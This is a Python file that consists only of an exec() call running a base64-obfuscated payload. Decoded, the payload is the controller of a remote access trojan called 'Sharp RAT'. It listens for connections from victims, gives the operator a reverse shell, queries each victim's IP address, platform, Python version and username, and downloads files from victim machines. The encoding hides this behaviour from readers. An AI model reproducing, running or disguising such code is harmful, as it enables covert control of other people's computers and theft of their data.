exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('IyBmcm9tIHNldHRpbmcgaW1wb3J0IGhvc3QgLCBwb3J0CmltcG9ydCBzb2NrZXQgLCBvcyAsIHN5cyAsIHB5ZmlnbGV0ICwgdGltZQoKb2IgID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAsIHNvY2tldC5TT0NLX1NUUkVBTSkKdHJ5OgogICAgaG9zdCA9IHN5cy5hcmd2WzFdCiAgICBwb3J0ID0gaW50KHN5cy5hcmd2WzJdKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgiIFVzYWdlIDogPElQPiAgPFBPUlQ+ICIpCiAgICBwcmludCgiIFstXSBFbnRlciBJUCBhbmQgUG9ydCBudW1iZXIgIikKCm9zLnN5c3RlbSgiZWNobyBvZmYiKQpvcy5zeXN0ZW0oImNscyIpCgpvYi5iaW5kKChob3N0ICwgcG9ydCkpCm9iLmxpc3Rlbig1KQpkZWYgbG9nbygpOgogICAgcHJpbnQocHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiU2hhcnAgUkFUIiAsIGZvbnQ9InNsYW50IikpCmxvZ28oKQoKCiMgR2V0IFBJRCBhbmQgV2FpdCBmb3IgQ29ubmVjdGlvbgpwcmludCgiXG4gICBbK10gWW91ciBwaWQgaXMgOiAiLCBvcy5nZXRwaWQoKSkKcHJpbnQoZiIgICBbK10gV2FpdGluZyBmb3IgY29ubmVjdGlvbiBvbiB7aG9zdH0gOiB7cG9ydH0iKQoKIyBHb3QgY29ubmVjdGlvbgpvYmplY3QgLCBhZGQgPSBvYi5hY2NlcHQoKSAKcHJpbnQgKGYiICAgWytdIEdvdCBhIGNvbm5lY3Rpb24gZnJvbSAge2FkZFswXX06e2FkZFsxXX0iKQoKZGVmIGZpbGUoZl9uYW1lKToKICAgIGVycm9yID0gMAogICAgZiA9b3BlbigiQ29wIDoiK2ZfbmFtZSAsICJhYiIpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGRhdGEgPSBvYmplY3QucmVjdigxMDI0KQogICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICBmLmNsb3NlKCkKICAgICAgICAgICAgZXJyb3IgPSAxCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZi53cml0ZShkYXRhKQogICAgaWYgbm90IChlcnJvciA9PSAxKToKICAgICAgICBvcy5yZW1vdmUoZl9uYW1lKQogICAgcHJpbnQoIlsgUmVjaWV2ZWQgZmlsZSBdIisgZl9uYW1lKQojIFJldmVyc2UgU2hlbGwgCmRlZiByZXZlcnNlX3NoZWxsKCk6CiAgICAgICAgb2JqZWN0LnNlbmQobXNnMC5lbmNvZGUoKSkKICAgICAgICBsb2dvMSA9IHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoIlJldmVyc2UgU2hlbGwiKQogICAgICAgIHByaW50KGxvZ28xKQogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGN3ZCAgPSBvYmplY3QucmVjdigxMDI0KS5kZWNvZGUoKQogICAgICAgICAgICBjbWQgPSBpbnB1dChmIntjd2Quc3RyaXAoKX0+IikKICAgICAgICAgICAgaWYgKGxlbihjbWQpID09IDApOgogICAgICAgICAgICAgICAgcHJpbnQoIkVudGVyIGFueSBjb21tYW5kIFxuIHR5cGUgJ0V4aXQgZm9yIHF1aXQnIikKICAgICAgICAgICAgICAgIGNtZCA9ICJoZWxwIgogICAgICAgICAgICBvYmplY3Quc2VuZChjbWQuZW5jb2RlKCkpCiAgICAgICAgICAgIGlmIChjbWQgPT0gImV4aXQiKToKICAgICAgICAgICAgICAgIGxvZ28yID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiRXhpdCIgLCBmb250PSJidWxiaGVhZCIpCiAgICAgICAgICAgICAgICBwcmludChsb2dvMikgCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBvdXQgPSBvYmplY3QucmVjdig1MTIwKS5kZWNvZGUoKQogICAgICAgICAgICBwcmludChvdXQpICAgCmNvbiA9IFRydWUgICAgCndoaWxlIGNvbjoKICAgICMgc2VuZCB0byBjbGllbnQgLi4KICAgIG1zZzAgPSBpbnB1dCgiXG5JbnRlclByZXRlci8+IDogIikubG93ZXIoKS5zdHJpcCgpCiAgICBpZiAobXNnMCA9PSAiaGVscCIpOgogICAgICAgIHByaW50KCcnJwogICAgICAgIFxuIGdldCByZXYgICAgICAgICAgRm9yIFJldmVyc2UgU2hlbGwKICAgICAgICBcbiBnZXQgaXAgICAgICAgICAgIEZvciBDaGVjayB2aWN0aW0gaXAgYWRkcmVzcwogICAgICAgIFxuIGdldCBweXRob24gLXYgICAgRm9yIENoZWNrIHZpY3RpbSBweXRob24gdmVyc2lvbgogICAgICAgIFxuIGdldCBwbGF0ZWZvcm0gICAgRm9yIENoZWNrIHZpY3RpbSBwbGF0ZWZvcm0KICAgICAgICBcbiBnZXQgdXNlcm5hbWUgICAgIEZvciB1c2VybmFtZSBvZiB2aWN0aW0KICAgICAgICBcbiBoZWxwICAgICAgICAgICAgIEZvciBoZWxwCiAgICAgICAgXG4gZXhpdCAgICAgICAgICAgICBGb3IgY2xvc2Ugc2Vzc2lvbgogICAgICAgICcnJwogICAgICAgICkKICAgIGVsaWYgKGxlbihtc2cwKSA9PSAwKToKICAgICAgICBwcmludCgiVHlwZSBoZWxwIGZvciBoZWxwIC4uIikKICAgIGVsaWYgKG1zZzAgPT0gImV4aXQiKToKICAgICAgICBtcyA9IG1zZzAuZW5jb2RlKCkKICAgICAgICBvYmplY3Quc2VuZChtcykKICAgICAgICBvYi5jbG9zZSgpCiAgICAgICAgY29uID0gRmFsc2UKICAgIGVsaWYobXNnMCA9PSAiZ2V0IHJldiIgKToKICAgICAgICByZXZlcnNlX3NoZWxsKCkKICAgIGVsaWYobXNnMFswOjRdID09ICJkb3duIik6CiAgICAgICAgZmkgPSBtc2cwWzU6XQogICAgICAgIG9iamVjdC5zZW5kKG1zZzAuZW5jb2RlKCkpCiAgICAgICAgZmlsZShmaSkgCiAgICBlbHNlOgoKICAgICAgICBtcyA9IG1zZzAuZW5jb2RlKCkKICAgICAgICAKICAgICAgICBvYmplY3Quc2VuZChtcykKICAgICAgICAjIHJlY2lldmUgZnJvbSBjbGllbnQgLi4KICAgICAgICBtc2cxID0gb2JqZWN0LnJlY3YoMTAyNCkKICAgICAgICBtc2cgPSBtc2cxLmRlY29kZSgpCiAgICAgICAgaWYobXNnID09ICJzZW5kLnR4dCIpOgogICAgICAgICAgICBmaWxlKCkKICAgICAgICBpZiAobXNnID09ICJxdWl0Iik6CiAgICAgICAgICAgIGNvbiA9IEZhbHNlCiAgICAgICAgICAgIG1zZyA9IHByaW50KCJZb3VyIGNvbm5lY3Rpb24gd2FzIHVuc3RhYmxlIC4uLi4iKQogICAgICAgICAgICBvYi5jbG9zZSgpICAKICAgICAgICBwcmludCggIlxuIiAsbXNnKQojICBGb3IgRW5jb2RlIGRhdGEg'
)[0]))

